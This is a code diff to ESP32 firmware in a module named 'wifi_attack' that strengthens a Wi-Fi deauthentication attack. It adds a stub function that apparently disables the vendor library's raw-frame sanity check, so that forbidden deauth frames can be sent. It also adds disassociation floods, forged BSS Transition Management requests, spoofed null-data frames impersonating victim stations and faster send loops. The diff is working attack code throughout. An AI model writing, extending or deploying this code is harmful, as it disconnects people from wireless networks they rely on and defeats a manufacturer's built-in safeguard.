@@ -11,8 +11,16 @@ static const char *TAG = "wifi_attack";
 
 /* ---- Deauth ---- */
 
+int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
+{
+    (void)arg;
+    (void)arg2;
+    (void)arg3;
+    return 0;
+}
+
 typedef struct {
-    uint8_t frame_ctrl[2];   /* 0xC0, 0x00 */
+    uint8_t frame_ctrl[2];
     uint8_t duration[2];
     uint8_t dest[6];
     uint8_t src[6];
@@ -26,6 +34,17 @@ static volatile bool deauth_running = false;
 static uint8_t deauth_target_bssid[6];
 static uint8_t deauth_channel = 1;
 static uint16_t deauth_reason = 7; /* class3 frame from nonassociated STA */
+static volatile uint32_t deauth_tx_ok = 0;
+static volatile uint32_t deauth_tx_err = 0;
+static volatile uint32_t deauth_tx_deauth_ok = 0;
+static volatile uint32_t deauth_tx_deauth_err = 0;
+static volatile uint32_t deauth_tx_disassoc_ok = 0;
+static volatile uint32_t deauth_tx_disassoc_err = 0;
+static volatile uint32_t deauth_tx_btm_ok = 0;
+static volatile uint32_t deauth_tx_btm_err = 0;
+static volatile uint32_t deauth_tx_null_ok = 0;
+static volatile uint32_t deauth_tx_null_err = 0;
+static uint8_t deauth_dialog_token = 1;
 
 #define DEAUTH_MULTI_MAX 4
 
@@ -39,20 +58,115 @@ typedef struct {
 static deauth_target_t deauth_targets[DEAUTH_MULTI_MAX];
 static uint8_t deauth_target_count = 0;
 
+static void deauth_build_frame(deauth_frame_t *frame, uint8_t subtype,
+                               const uint8_t dest[6], const uint8_t src[6],
+                               const uint8_t bssid[6], uint16_t reason,
+                               uint16_t seq)
+{
+    memset(frame, 0, sizeof(*frame));
+    frame->frame_ctrl[0] = subtype;
+    frame->frame_ctrl[1] = 0x00;
+    frame->duration[0] = 0x3a;
+    frame->duration[1] = 0x01;
+    memcpy(frame->dest, dest, 6);
+    memcpy(frame->src, src, 6);
+    memcpy(frame->bssid, bssid, 6);
+    frame->seq_ctrl = (uint16_t)(seq << 4);
+    frame->reason_code = reason;
+}
+
+typedef struct {
+    volatile uint32_t *ok;
+    volatile uint32_t *err;
+} deauth_tx_stat_t;
+
+static void deauth_send_raw(const void *frame, size_t len, const deauth_tx_stat_t *stat)
+{
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
+    if (err == ESP_OK) {
+        deauth_tx_ok++;
+        if (stat && stat->ok) {
+            (*stat->ok)++;
+        }
+    } else {
+        deauth_tx_err++;
+        if (stat && stat->err) {
+            (*stat->err)++;
+        }
+        if ((deauth_tx_err & 0x3F) == 1) {
+            ESP_LOGW(TAG, "deauth tx failed: %s", esp_err_to_name(err));
+        }
+    }
+}
+
+static void deauth_send_frame(const deauth_frame_t *frame, const deauth_tx_stat_t *stat)
+{
+    deauth_send_raw(frame, sizeof(*frame), stat);
+}
+
+static void deauth_send_btm_request(const uint8_t sta[6], const uint8_t bssid[6],
+                                    uint16_t seq)
+{
+    uint8_t frame[31];
+    uint16_t seq_ctrl = (uint16_t)(seq << 4);
+
+    memset(frame, 0, sizeof(frame));
+    frame[0] = 0xD0; /* action */
+    memcpy(&frame[4], sta, 6);
+    memcpy(&frame[10], bssid, 6);
+    memcpy(&frame[16], bssid, 6);
+    memcpy(&frame[22], &seq_ctrl, sizeof(seq_ctrl));
+
+    frame[24] = 0x0A; /* WNM */
+    frame[25] = 0x07; /* BSS Transition Management Request */
+    frame[26] = deauth_dialog_token++;
+    frame[27] = 0x04; /* disassociation imminent */
+    frame[28] = 0x01; /* disassociation timer, little-endian */
+    frame[29] = 0x00;
+    frame[30] = 0x01; /* validity interval */
+
+    const deauth_tx_stat_t stat = { &deauth_tx_btm_ok, &deauth_tx_btm_err };
+    deauth_send_raw(frame, sizeof(frame), &stat);
+}
+
+static void deauth_send_spoofed_null_data(const uint8_t sta[6], const uint8_t bssid[6],
+                                          uint16_t seq)
+{
+    uint8_t frame[24];
+    uint16_t seq_ctrl = (uint16_t)(seq << 4);
+
+    memset(frame, 0, sizeof(frame));
+    frame[0] = 0x48; /* null data */
+    frame[1] = 0x01; /* To DS */
+    memcpy(&frame[4], bssid, 6); /* receiver/AP */
+    memcpy(&frame[10], sta, 6);  /* spoofed station */
+    memcpy(&frame[16], bssid, 6);
+    memcpy(&frame[22], &seq_ctrl, sizeof(seq_ctrl));
+
+    const deauth_tx_stat_t stat = { &deauth_tx_null_ok, &deauth_tx_null_err };
+    deauth_send_raw(frame, sizeof(frame), &stat);
+}
+
+static void deauth_reset_stats(void)
+{
+    deauth_tx_ok = 0;
+    deauth_tx_err = 0;
+    deauth_tx_deauth_ok = 0;
+    deauth_tx_deauth_err = 0;
+    deauth_tx_disassoc_ok = 0;
+    deauth_tx_disassoc_err = 0;
+    deauth_tx_btm_ok = 0;
+    deauth_tx_btm_err = 0;
+    deauth_tx_null_ok = 0;
+    deauth_tx_null_err = 0;
+}
+
 static void deauth_task(void *arg)
 {
     (void)arg;
     deauth_frame_t frame;
-
-    memset(&frame, 0, sizeof(frame));
-    frame.frame_ctrl[0] = 0xC0; /* deauth */
-    frame.frame_ctrl[1] = 0x00;
-    frame.reason_code = deauth_reason;
-
-    /* Broadcast deauth: dest = FF:FF:FF:FF:FF:FF */
-    memset(frame.dest, 0xFF, 6);
-    memcpy(frame.src, deauth_target_bssid, 6);
-    memcpy(frame.bssid, deauth_target_bssid, 6);
+    const uint8_t broadcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
+    uint16_t seq = 0;
 
     esp_wifi_set_channel(deauth_channel, WIFI_SECOND_CHAN_NONE);
 
@@ -62,9 +176,16 @@ static void deauth_task(void *arg)
              deauth_target_bssid[3], deauth_target_bssid[4], deauth_target_bssid[5]);
 
     while (deauth_running) {
-        frame.seq_ctrl++;
-        esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(frame), false);
-        vTaskDelay(pdMS_TO_TICKS(10));
+        const deauth_tx_stat_t deauth_stat = { &deauth_tx_deauth_ok, &deauth_tx_deauth_err };
+        const deauth_tx_stat_t disassoc_stat = { &deauth_tx_disassoc_ok, &deauth_tx_disassoc_err };
+
+        deauth_build_frame(&frame, 0xC0, broadcast, deauth_target_bssid,
+                           deauth_target_bssid, deauth_reason, ++seq);
+        deauth_send_frame(&frame, &deauth_stat);
+        deauth_build_frame(&frame, 0xA0, broadcast, deauth_target_bssid,
+                           deauth_target_bssid, 8, ++seq);
+        deauth_send_frame(&frame, &disassoc_stat);
+        vTaskDelay(pdMS_TO_TICKS(2));
     }
 
     ESP_LOGI(TAG, "Deauth stopped");
@@ -76,31 +197,39 @@ static void deauth_multi_task(void *arg)
     (void)arg;
     deauth_frame_t frame;
     uint16_t seq = 0;
+    const uint8_t broadcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
 
     ESP_LOGI(TAG, "Multi deauth started, targets=%d", deauth_target_count);
 
     while (deauth_running) {
         for (uint8_t i = 0; i < deauth_target_count && deauth_running; i++) {
             deauth_target_t *t = &deauth_targets[i];
-
-            memset(&frame, 0, sizeof(frame));
-            frame.frame_ctrl[0] = 0xC0;
-            frame.frame_ctrl[1] = 0x00;
-            frame.reason_code = deauth_reason;
-            frame.seq_ctrl = ++seq;
-
-            if (t->mode == 1) {
-                memcpy(frame.dest, t->sta, 6);
-            } else {
-                memset(frame.dest, 0xFF, 6);
-            }
-            memcpy(frame.src, t->bssid, 6);
-            memcpy(frame.bssid, t->bssid, 6);
+            const deauth_tx_stat_t deauth_stat = { &deauth_tx_deauth_ok, &deauth_tx_deauth_err };
+            const deauth_tx_stat_t disassoc_stat = { &deauth_tx_disassoc_ok, &deauth_tx_disassoc_err };
 
             esp_wifi_set_channel(t->channel, WIFI_SECOND_CHAN_NONE);
             for (uint8_t n = 0; n < 6 && deauth_running; n++) {
-                esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(frame), false);
-                vTaskDelay(pdMS_TO_TICKS(5));
+                if (t->mode == 1) {
+                    deauth_build_frame(&frame, 0xC0, t->sta, t->bssid,
+                                       t->bssid, deauth_reason, ++seq);
+                    deauth_send_frame(&frame, &deauth_stat);
+                    deauth_build_frame(&frame, 0xA0, t->sta, t->bssid,
+                                       t->bssid, 8, ++seq);
+                    deauth_send_frame(&frame, &disassoc_stat);
+                    deauth_send_btm_request(t->sta, t->bssid, ++seq);
+                    deauth_send_spoofed_null_data(t->sta, t->bssid, ++seq);
+                    deauth_build_frame(&frame, 0xC0, t->bssid, t->sta,
+                                       t->bssid, deauth_reason, ++seq);
+                    deauth_send_frame(&frame, &deauth_stat);
+                } else {
+                    deauth_build_frame(&frame, 0xC0, broadcast, t->bssid,
+                                       t->bssid, deauth_reason, ++seq);
+                    deauth_send_frame(&frame, &deauth_stat);
+                    deauth_build_frame(&frame, 0xA0, broadcast, t->bssid,
+                                       t->bssid, 8, ++seq);
+                    deauth_send_frame(&frame, &disassoc_stat);
+                }
+                vTaskDelay(pdMS_TO_TICKS(2));
             }
         }
     }
@@ -130,6 +259,7 @@ void deauth_start(const m1_cmd_t *cmd, m1_resp_t *resp)
     } else {
         deauth_reason = 7;
     }
+    deauth_reset_stats();
 
     /* Need promiscuous mode for raw frame TX */
     esp_wifi_set_promiscuous(true);
@@ -175,6 +305,7 @@ void deauth_multi_start(const m1_cmd_t *cmd, m1_resp_t *resp)
 
     deauth_target_count = count;
     deauth_reason = 7;
+    deauth_reset_stats();
 
     esp_wifi_set_promiscuous(true);
     deauth_running = true;
@@ -188,13 +319,34 @@ void deauth_multi_start(const m1_cmd_t *cmd, m1_resp_t *resp)
 void deauth_stop(const m1_cmd_t *cmd, m1_resp_t *resp)
 {
     (void)cmd;
+    uint32_t tx_ok = deauth_tx_ok;
+    uint32_t tx_err = deauth_tx_err;
+    uint32_t deauth_ok = deauth_tx_deauth_ok;
+    uint32_t deauth_err = deauth_tx_deauth_err;
+    uint32_t disassoc_ok = deauth_tx_disassoc_ok;
+    uint32_t disassoc_err = deauth_tx_disassoc_err;
+    uint32_t btm_ok = deauth_tx_btm_ok;
+    uint32_t btm_err = deauth_tx_btm_err;
+    uint32_t null_ok = deauth_tx_null_ok;
+    uint32_t null_err = deauth_tx_null_err;
+
     deauth_running = false;
     deauth_task_handle = NULL;
     deauth_target_count = 0;
     esp_wifi_set_promiscuous(false);
 
     resp->status = RESP_OK;
-    resp->payload_len = 0;
+    memcpy(&resp->payload[0], &tx_ok, sizeof(tx_ok));
+    memcpy(&resp->payload[4], &tx_err, sizeof(tx_err));
+    memcpy(&resp->payload[8], &deauth_ok, sizeof(deauth_ok));
+    memcpy(&resp->payload[12], &deauth_err, sizeof(deauth_err));
+    memcpy(&resp->payload[16], &disassoc_ok, sizeof(disassoc_ok));
+    memcpy(&resp->payload[20], &disassoc_err, sizeof(disassoc_err));
+    memcpy(&resp->payload[24], &btm_ok, sizeof(btm_ok));
+    memcpy(&resp->payload[28], &btm_err, sizeof(btm_err));
+    memcpy(&resp->payload[32], &null_ok, sizeof(null_ok));
+    memcpy(&resp->payload[36], &null_err, sizeof(null_err));
+    resp->payload_len = 40;
 }
 
 /* ---- Beacon Spam ---- */
